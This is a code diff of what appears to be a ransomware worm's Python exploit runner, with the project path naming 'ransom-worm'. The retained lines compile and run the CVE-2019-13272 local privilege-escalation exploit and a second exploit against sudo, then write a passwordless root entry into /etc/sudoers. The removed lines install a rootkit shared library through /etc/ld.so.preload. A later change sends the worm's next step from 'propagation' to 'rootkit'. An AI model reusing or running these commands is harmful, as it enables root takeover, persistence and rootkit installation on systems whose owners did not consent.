@@ -89,30 +89,12 @@ def run_exploit(exploit):
 
     if exploit == "CVE-2019-13272":
         try:
-            print("1")
             run_command(process, f"gcc -s {exploits}/cve-2019-13272.c -o exploit \n")
-            print("2")
             run_command(process, "./exploit \n")
-            print("3")
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            print("4")
-            run_command(process, "touch /etc/ld.so.preload \n")
-            print("5")
-            run_command(
-                process,
-                "gcc -fPIC -shared ./utils/rootkit.c -o ./utils/rootkit.so -ldl \n",
-            )
-            print("6")
-            run_command(
-                process,
-                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
-            )
-            print("7")
-            run_command(process, 'echo "exit" \n')
-            print("8")
-
+            
             # read output
             output = process.stdout.readline()
             while str(output.strip()) != "b'exit'":
@@ -132,11 +114,6 @@ def run_exploit(exploit):
             run_command(process, "./exploit /usr/bin/sudo \n")
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
-            )
-            run_command(process, "touch /etc/ld.so.preload \n")
-            run_command(
-                process,
-                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
 
@@ -199,7 +176,7 @@ def run():
         # - kernel version
         if exploit_kernel():
             print("kernel exploited")
-            next_action = "propagation"
+            next_action = "rootkit"
         else:
             print("no kernel exploit available")
             # test something else
